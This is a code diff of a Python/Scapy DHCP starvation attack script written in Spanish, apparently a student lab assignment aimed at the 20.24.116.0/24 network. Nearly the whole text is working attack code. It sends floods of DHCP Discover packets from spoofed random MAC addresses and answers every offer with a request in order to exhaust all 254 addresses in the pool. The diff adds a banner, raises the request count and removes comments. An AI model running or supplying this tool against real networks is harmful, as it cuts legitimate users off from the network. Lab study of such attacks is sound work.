@@ -2,8 +2,8 @@
 """
 SCRIPT: dhcp_starvation_20241165.py
 AUTOR: Matrícula 20241165
-RED: 20.24.116.0/24
-SERVIDOR DHCP: 20.24.116.4
+FECHA: Febrero 2025
+PROPÓSITO: Ataque DHCP Starvation en red 20.24.116.0/24
 """
 
 from scapy.all import *
@@ -18,9 +18,9 @@ GREEN = '\033[92m'
 YELLOW = '\033[93m'
 RED = '\033[91m'
 BLUE = '\033[94m'
+PURPLE = '\033[95m'
 END = '\033[0m'
 
-# Configuración global de Scapy
 conf.checkIPaddr = False
 
 class DHCPStarvation:
@@ -35,6 +35,19 @@ class DHCPStarvation:
             'request': 0,
             'ack': 0
         }
+        
+    def banner(self):
+        """Muestra banner del ataque"""
+        os.system('clear')
+        print(f"{PURPLE}{'='*70}{END}")
+        print(f"{PURPLE}    DHCP STARVATION ATTACK - MATRÍCULA 20241165{END}")
+        print(f"{PURPLE}{'='*70}{END}")
+        print(f"{YELLOW}[*] Interfaz: {self.interface}{END}")
+        print(f"{YELLOW}[*] Servidor DHCP objetivo: {self.dhcp_server}{END}")
+        print(f"{YELLOW}[*] Red objetivo: 20.24.116.0/24{END}")
+        print(f"{YELLOW}[*] Gateway: 20.24.116.1{END}")
+        print(f"{YELLOW}[*] Total IPs a robar: 254{END}")
+        print(f"{PURPLE}{'='*70}{END}\n")
         
     def generar_mac(self):
         """Genera MAC aleatoria para VMWare/PNELAB"""
@@ -74,7 +87,7 @@ class DHCPStarvation:
     
     def manejar_offer(self, pkt):
         """Procesa DHCP Offer"""
-        if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # Offer
+        if DHCP in pkt and pkt[DHCP].options[0][1] == 2:
             ip_ofrecida = pkt[BOOTP].yiaddr
             ip_servidor = pkt[IP].src
             mac_cliente = pkt[Ether].dst
@@ -89,22 +102,16 @@ class DHCPStarvation:
                 print(f"    IP: {ip_ofrecida}")
                 print(f"    Servidor: {ip_servidor}")
                 
-                # Enviar Request inmediatamente
                 request_pkt = self.crear_request(mac_cliente, ip_ofrecida, ip_servidor, xid)
                 sendp(request_pkt, iface=self.interface, verbose=0)
                 self.stats['request'] += 1
                 print(f"{RED}[!] IP ROBADA: {ip_ofrecida}{END}")
                 
-    def atacar(self, num_peticiones=250):
+    def atacar(self, num_peticiones=254):
         """Ejecuta el ataque de starvation"""
-        print(f"{BLUE}{'='*60}{END}")
-        print(f"{BLUE}DHCP STARVATION ATTACK - MATRÍCULA 20241165{END}")
-        print(f"{BLUE}{'='*60}{END}")
-        print(f"{YELLOW}[*] Interfaz: {self.interface}{END}")
-        print(f"{YELLOW}[*] Servidor DHCP objetivo: {self.dhcp_server}{END}")
-        print(f"{YELLOW}[*] Peticiones a enviar: {num_peticiones}{END}")
-        print(f"{YELLOW}[*] Pool DHCP: 20.24.116.0/24{END}")
-        print(f"{BLUE}{'='*60}{END}\n")
+        self.banner()
+        print(f"{YELLOW}[*] Iniciando ataque con {num_peticiones} peticiones...{END}")
+        print(f"{YELLOW}[*] Presiona Ctrl+C para detener{END}\n")
         
         # Hilo para capturar DHCP Offers
         def capturar_offers():
@@ -120,18 +127,15 @@ class DHCPStarvation:
         # Enviar DHCP Discover masivos
         try:
             for i in range(num_peticiones):
-                # Generar MAC única
                 mac = self.generar_mac()
                 while mac in self.used_macs:
                     mac = self.generar_mac()
                 self.used_macs.append(mac)
                 
-                # Enviar DHCP Discover
                 discover_pkt, xid = self.crear_discover(mac)
                 sendp(discover_pkt, iface=self.interface, verbose=0)
                 self.stats['discover'] += 1
                 
-                # Mostrar progreso
                 if (i + 1) % 20 == 0:
                     print(f"{BLUE}[*] Progreso: {i+1}/{num_peticiones}{END}")
                     print(f"    - DHCP Discover enviados: {self.stats['discover']}")
@@ -139,21 +143,20 @@ class DHCPStarvation:
                     print(f"    - IPs robadas: {len(self.stolen_ips)}")
                     print(f"    - MACs usadas: {len(self.used_macs)}")
                 
-                time.sleep(0.02)  # 20ms entre peticiones
+                time.sleep(0.02)
                 
         except KeyboardInterrupt:
             print(f"\n{RED}[!] Ataque detenido por el usuario{END}")
         except Exception as e:
             print(f"{RED}[-] Error: {e}{END}")
         
-        # Mostrar resultados finales
         self.mostrar_resultados()
     
     def mostrar_resultados(self):
         """Muestra estadísticas finales del ataque"""
-        print(f"\n{BLUE}{'='*60}{END}")
+        print(f"\n{BLUE}{'='*70}{END}")
         print(f"{BLUE}RESULTADOS FINALES DEL ATAQUE{END}")
-        print(f"{BLUE}{'='*60}{END}")
+        print(f"{BLUE}{'='*70}{END}")
         print(f"{YELLOW}[*] DHCP Discover enviados: {self.stats['discover']}{END}")
         print(f"{YELLOW}[*] DHCP Offers recibidos: {self.stats['offer']}{END}")
         print(f"{YELLOW}[*] DHCP Requests enviados: {self.stats['request']}{END}")
@@ -165,24 +168,21 @@ class DHCPStarvation:
             for i, ip in enumerate(self.stolen_ips[:20], 1):
                 print(f"  {i:2d}. {ip}")
             
-            # Mostrar rango de IPs robadas
-            ips_numeros = [int(ip.split('.')[3]) for ip in self.stolen_ips]
+            ips_numeros = [int(ip.split('.')[3]) for ip in self.stolen_ips if ip.split('.')[3].isdigit()]
             if ips_numeros:
                 print(f"\n{GREEN}Rango de IPs robadas:{END}")
                 print(f"  Desde: 20.24.116.{min(ips_numeros)}")
                 print(f"  Hasta: 20.24.116.{max(ips_numeros)}")
         
-        print(f"{BLUE}{'='*60}{END}")
+        print(f"{BLUE}{'='*70}{END}")
 
 def main():
     """Función principal"""
-    # Verificar permisos de root
     if os.geteuid() != 0:
         print(f"{RED}[-] Este script requiere permisos de root!{END}")
         print(f"{YELLOW}[*] Ejecuta: sudo python3 {sys.argv[0]}{END}")
         sys.exit(1)
     
-    # Verificar interfaz
     interface = "eth0"
     try:
         get_if_hwaddr(interface)
@@ -192,10 +192,8 @@ def main():
         os.system("ip link show | grep -E '^[0-9]+' | cut -d: -f2")
         sys.exit(1)
     
-    # Iniciar ataque
     atacante = DHCPStarvation(interface=interface)
-    atacante.atacar(num_peticiones=254)  # Agotar todo el pool
+    atacante.atacar(num_peticiones=254)
 
 if __name__ == "__main__":
-    main()
     main()
